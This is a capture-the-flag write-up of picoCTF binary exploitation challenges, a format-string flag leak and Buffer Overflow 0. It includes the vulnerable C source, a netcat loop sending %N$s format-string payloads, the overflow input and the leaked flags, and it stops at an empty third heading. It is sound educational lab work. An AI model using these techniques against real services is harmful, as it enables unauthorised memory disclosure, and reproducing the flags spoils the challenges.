# Binary Exploitation-

# 1) Flag leak 
all right for this chall,we are given with files one is a executable file vuln and the other is the source code in C.

![image](https://github.com/user-attachments/assets/6a5a5269-efbe-4f40-bc9c-6ffcdd118c4e)

soo lets check the source code of the given problem.

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64

void readflag(char* buf, size_t len) {
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,len,f); // size bound read
}

void vuln(){
   char flag[BUFSIZE];
   char story[128];

   readflag(flag, FLAGSIZE);

   printf("Tell me a story and then I'll tell you one >> ");
   scanf("%127s", story);
   printf("Here's a story - \n");
   printf(story);
   printf("\n");
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);

  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  return 0;
}
```
I can see that it print whatever i give it this means i can get format string attack on this.

https://owasp.org/www-community/attacks/Format_string_attack

I referred to the above website to understand more about format string attack.

soooo i tried to get to use %x%x repeatly 

but well i got the flag in a bit of jumbled up way.

so i knew i had to do something different.

so i used a script to change the offset and read me the flag from stack.

```
gnix@GNIX:~$ for i in {0..100}; do echo "%$i\$s" | nc saturn.picoctf.net 62521; done
Tell me a story and then I'll tell you one >> Here's a story -
%0$s
Tell me a story and then I'll tell you one >> Here's a story -
%1$s
Tell me a story and then I'll tell you one >> Here's a story -
�-�
Tell me a story and then I'll tell you one >> Here's a story -
�ú,
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
(null)
Tell me a story and then I'll tell you one >> Here's a story -
/
Tell me a story and then I'll tell you one >> Here's a story -

Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
(null)
Tell me a story and then I'll tell you one >> Here's a story -
�.
Tell me a story and then I'll tell you one >> Here's a story -

Tell me a story and then I'll tell you one >> Here's a story -
(null)
Tell me a story and then I'll tell you one >> Here's a story -

Tell me a story and then I'll tell you one >> Here's a story -
�������
Tell me a story and then I'll tell you one >> Here's a story -
��h�g
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
(null)
Tell me a story and then I'll tell you one >> Here's a story -
setresgid
Tell me a story and then I'll tell you one >> Here's a story -
�!y�
Tell me a story and then I'll tell you one >> Here's a story -
��e�

Tell me a story and then I'll tell you one >> Here's a story -
setresgid
Tell me a story and then I'll tell you one >> Here's a story -

Tell me a story and then I'll tell you one >> Here's a story -
CTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a}
Tell me a story and then I'll tell you one >> Here's a story -
�j�
Tell me a story and then I'll tell you one >> Here's a story -
ii
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
(null)
Tell me a story and then I'll tell you one >> Here's a story -
ii
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
$�
Tell me a story and then I'll tell you one >> Here's a story -

Tell me a story and then I'll tell you one >> Here's a story -
�(��g���g���g���g���g���g���g���h���
Tell me a story and then I'll tell you one >> Here's a story -
����������؉ǀ�u��^H�C�p��s��u��C
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
^C
```
at around some iterations i got CTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a} without the proper format however i wrapped it in proper format and got the flag.

```
flag-picoCTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a}

```

# 2) Buffer Overflow 0-
so the challenge begins with a source code and an instance

i cat the source code 
```
gnix@GNIX:~$ wget https://artifacts.picoctf.net/c/172/vuln.c
--2024-12-22 10:23:42--  https://artifacts.picoctf.net/c/172/vuln.c
Resolving artifacts.picoctf.net (artifacts.picoctf.net)... 108.159.61.26, 108.159.61.96, 108.159.61.109, ...
Connecting to artifacts.picoctf.net (artifacts.picoctf.net)|108.159.61.26|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 808 [application/octet-stream]
Saving to: ‘vuln.c.1’

vuln.c.1                      100%[=================================================>]     808  --.-KB/s    in 0s

2024-12-22 10:23:44 (186 MB/s) - ‘vuln.c.1’ saved [808/808]

gnix@GNIX:~$ cat vuln.c.1
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){

  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler

  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1);
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}
```
well as the name suggested it was buufer overflow and as I checked the source code the max flag size was of 64 characters. so i inputted a random 100 characters into the program and got the flag.

```
gnix@GNIX:~$ nc saturn.picoctf.net 57113
Input: SMuxGQ!cMR7f8uPXYfV3JmB&CHq9Q&BYj2tJSe73rKYV&dGYwjYD4Y@oCqp7ge05m75%soWogTqdE&gyXhDO6h5YP0FFFsnF#Phf
picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}

```
# 3) Format String 0-


